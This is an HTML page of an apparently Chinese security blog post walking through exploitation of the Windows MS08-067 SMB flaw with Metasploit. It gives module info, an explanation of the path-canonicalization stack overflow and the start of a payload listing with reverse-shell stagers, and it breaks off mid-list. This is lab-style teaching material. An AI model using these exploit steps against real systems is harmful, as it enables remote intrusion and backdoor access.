@@ -1,0 +1,1467 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="float">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="float">
+    <meta name="keywords" content="Hexo | float">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结 · float&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >float&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>float's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">5,197</span> / Reading time: <span class="post-count">29 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/02/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>MS08-067—-内存攻击实践</p>
+</blockquote>
+<h2 id="MS08-067介绍"><a href="#MS08-067介绍" class="headerlink" title="MS08-067介绍"></a>MS08-067介绍</h2><p>　　下面是Metasploit中的信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search MS08-067</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                 Disclosure Date  Rank   Check  Description</span><br><span class="line">   ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line">     Module: exploit/windows/smb/ms08_067_netapi</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Great</span><br><span class="line">  Disclosed: 2008-10-28</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  hdm &lt;x@hdm.io&gt;</span><br><span class="line">  Brett Moore &lt;brett.moore@insomniasec.com&gt;</span><br><span class="line">  frank2 &lt;frank2@dc949.org&gt;</span><br><span class="line">  jduck &lt;jduck@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic Targeting</span><br><span class="line">  1   Windows 2000 Universal</span><br><span class="line">  2   Windows XP SP0/SP1 Universal</span><br><span class="line">  3   Windows 2003 SP0 Universal</span><br><span class="line">  4   Windows XP SP2 English (AlwaysOn NX)</span><br><span class="line">  5   Windows XP SP2 English (NX)</span><br><span class="line">  6   Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">  7   Windows XP SP3 English (NX)</span><br><span class="line">  8   Windows XP SP2 Arabic (NX)</span><br><span class="line">  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)</span><br><span class="line">  10  Windows XP SP2 Chinese - Simplified (NX)</span><br><span class="line">  11  Windows XP SP2 Chinese - Traditional (NX)</span><br><span class="line">  12  Windows XP SP2 Czech (NX)</span><br><span class="line">  13  Windows XP SP2 Danish (NX)</span><br><span class="line">  14  Windows XP SP2 German (NX)</span><br><span class="line">  15  Windows XP SP2 Greek (NX)</span><br><span class="line">  16  Windows XP SP2 Spanish (NX)</span><br><span class="line">  17  Windows XP SP2 Finnish (NX)</span><br><span class="line">  18  Windows XP SP2 French (NX)</span><br><span class="line">  19  Windows XP SP2 Hebrew (NX)</span><br><span class="line">  20  Windows XP SP2 Hungarian (NX)</span><br><span class="line">  21  Windows XP SP2 Italian (NX)</span><br><span class="line">  22  Windows XP SP2 Japanese (NX)</span><br><span class="line">  23  Windows XP SP2 Korean (NX)</span><br><span class="line">  24  Windows XP SP2 Dutch (NX)</span><br><span class="line">  25  Windows XP SP2 Norwegian (NX)</span><br><span class="line">  26  Windows XP SP2 Polish (NX)</span><br><span class="line">  27  Windows XP SP2 Portuguese - Brazilian (NX)</span><br><span class="line">  28  Windows XP SP2 Portuguese (NX)</span><br><span class="line">  29  Windows XP SP2 Russian (NX)</span><br><span class="line">  30  Windows XP SP2 Swedish (NX)</span><br><span class="line">  31  Windows XP SP2 Turkish (NX)</span><br><span class="line">  32  Windows XP SP3 Arabic (NX)</span><br><span class="line">  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)</span><br><span class="line">  34  Windows XP SP3 Chinese - Simplified (NX)</span><br><span class="line">  35  Windows XP SP3 Chinese - Traditional (NX)</span><br><span class="line">  36  Windows XP SP3 Czech (NX)</span><br><span class="line">  37  Windows XP SP3 Danish (NX)</span><br><span class="line">  38  Windows XP SP3 German (NX)</span><br><span class="line">  39  Windows XP SP3 Greek (NX)</span><br><span class="line">  40  Windows XP SP3 Spanish (NX)</span><br><span class="line">  41  Windows XP SP3 Finnish (NX)</span><br><span class="line">  42  Windows XP SP3 French (NX)</span><br><span class="line">  43  Windows XP SP3 Hebrew (NX)</span><br><span class="line">  44  Windows XP SP3 Hungarian (NX)</span><br><span class="line">  45  Windows XP SP3 Italian (NX)</span><br><span class="line">  46  Windows XP SP3 Japanese (NX)</span><br><span class="line">  47  Windows XP SP3 Korean (NX)</span><br><span class="line">  48  Windows XP SP3 Dutch (NX)</span><br><span class="line">  49  Windows XP SP3 Norwegian (NX)</span><br><span class="line">  50  Windows XP SP3 Polish (NX)</span><br><span class="line">  51  Windows XP SP3 Portuguese - Brazilian (NX)</span><br><span class="line">  52  Windows XP SP3 Portuguese (NX)</span><br><span class="line">  53  Windows XP SP3 Russian (NX)</span><br><span class="line">  54  Windows XP SP3 Swedish (NX)</span><br><span class="line">  55  Windows XP SP3 Turkish (NX)</span><br><span class="line">  56  Windows 2003 SP1 English (NO NX)</span><br><span class="line">  57  Windows 2003 SP1 English (NX)</span><br><span class="line">  58  Windows 2003 SP1 Japanese (NO NX)</span><br><span class="line">  59  Windows 2003 SP1 Spanish (NO NX)</span><br><span class="line">  60  Windows 2003 SP1 Spanish (NX)</span><br><span class="line">  61  Windows 2003 SP1 French (NO NX)</span><br><span class="line">  62  Windows 2003 SP1 French (NX)</span><br><span class="line">  63  Windows 2003 SP2 English (NO NX)</span><br><span class="line">  64  Windows 2003 SP2 English (NX)</span><br><span class="line">  65  Windows 2003 SP2 German (NO NX)</span><br><span class="line">  66  Windows 2003 SP2 German (NX)</span><br><span class="line">  67  Windows 2003 SP2 Portuguese - Brazilian (NX)</span><br><span class="line">  68  Windows 2003 SP2 Spanish (NO NX)</span><br><span class="line">  69  Windows 2003 SP2 Spanish (NX)</span><br><span class="line">  70  Windows 2003 SP2 Japanese (NO NX)</span><br><span class="line">  71  Windows 2003 SP2 French (NO NX)</span><br><span class="line">  72  Windows 2003 SP2 French (NX)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name     Current Setting  Required  Description</span><br><span class="line">  ----     ---------------  --------  -----------</span><br><span class="line">  RHOSTS                    yes       The target address range or CIDR identifier</span><br><span class="line">  RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 408</span><br><span class="line">  Avoid: 8 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a parsing flaw <span class="keyword">in</span> the path canonicalization </span><br><span class="line">  code of NetAPI32.dll through the Server Service. This module is </span><br><span class="line">  capable of bypassing NX on some operating systems and service packs. </span><br><span class="line">  The correct target must be used to prevent the Server Service (along </span><br><span class="line">  with a dozen others <span class="keyword">in</span> the same process) from crashing. Windows XP </span><br><span class="line">  targets seem to handle multiple successful exploitation events, but </span><br><span class="line">  2003 targets will often crash or hang on subsequent attempts. This </span><br><span class="line">  is just the first version of this module, full support <span class="keyword">for</span> NX bypass </span><br><span class="line">  on 2003, along with other platforms, is still <span class="keyword">in</span> development.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2008-4250/</span><br><span class="line">  OSVDB (49243)</span><br><span class="line">  https://technet.microsoft.com/en-us/library/security/MS08-067</span><br><span class="line">  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos</span><br></pre></td></tr></table></figure></p>
+<p>　　基本原理：MS08-067漏洞是通过MSRPC over SMB通道调用Server服务中的NetPathCanonicalize函数触发，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成了远程代码执行。<br>　　<br>　　路径规范化即就是将路径字符串中的<code>/</code>换为<code>\</code>，同时去除相对路径中的<code>\.\</code>和<code>\..\</code>。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;**\*\.\**&quot;    --&gt;   &quot;**\*\**&quot;</span><br><span class="line"></span><br><span class="line">&quot;**\*\..\**&quot;   --&gt;   &quot;**\**&quot;</span><br></pre></td></tr></table></figure></p>
+<p>　　<br>　　在路径规范化的操作中存在逻辑漏洞，构造一个恶意的路径字符串，可以在函数去掉”..\”时，把路径字符串中的内容复制到路径字符串之前的低地址空间中，达到覆盖函数返回地址，执行任意代码的目的。
+　　</p>
+<h2 id="攻击过程复现"><a href="#攻击过程复现" class="headerlink" title="攻击过程复现"></a>攻击过程复现</h2><p>　　在Metasploit中使用ms08_067_netapi模块<br><img src="/img/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/1.png" alt=""><br>　　<br>　　查看可用的payload攻击载荷，也就是shellcode。常用的攻击载荷类型有：开放监听后门、回连到控制端的后门、运行某个命令或程序、下载并执行可执行文件、添加系统用户等。这里我们选择运行后门，并让它回连到控制端。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"># 可用载荷</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show payloads </span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   generic/custom                                                       normal  No     Custom Payload</span><br><span class="line">   generic/debug_trap                                                   normal  No     Generic x86 Debug Trap</span><br><span class="line">   generic/shell_bind_tcp                                               normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   generic/shell_reverse_tcp                                            normal  No     Generic Command Shell, Reverse TCP Inline</span><br><span class="line">   generic/tight_loop                                                   normal  No     Generic x86 Tight Loop</span><br><span class="line">   windows/adduser                                                      normal  No     Windows Execute net user /ADD</span><br><span class="line">   windows/dllinject/bind_hidden_ipknock_tcp                            normal  No     Reflective DLL Injection, Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/dllinject/bind_hidden_tcp                                    normal  No     Reflective DLL Injection, Hidden Bind TCP Stager</span><br><span class="line">   windows/dllinject/bind_ipv6_tcp                                      normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/dllinject/bind_ipv6_tcp_uuid                                 normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/dllinject/bind_named_pipe                                    normal  No     Reflective DLL Injection, Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/dllinject/bind_nonx_tcp                                      normal  No     Reflective DLL Injection, Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/dllinject/bind_tcp                                           normal  No     Reflective DLL Injection, Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/dllinject/bind_tcp_rc4                                       normal  No     Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/dllinject/bind_tcp_uuid                                      normal  No     Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/dllinject/reverse_hop_http                                   normal  No     Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager</span><br><span class="line">   windows/dllinject/reverse_ipv6_tcp                                   normal  No     Reflective DLL Injection, Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/dllinject/reverse_nonx_tcp                                   normal  No     Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/dllinject/reverse_ord_tcp                                    normal  No     Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/dllinject/reverse_tcp                                        normal  No     Reflective DLL Injection, Reverse TCP Stager</span><br><span class="line">   windows/dllinject/reverse_tcp_allports                               normal  No     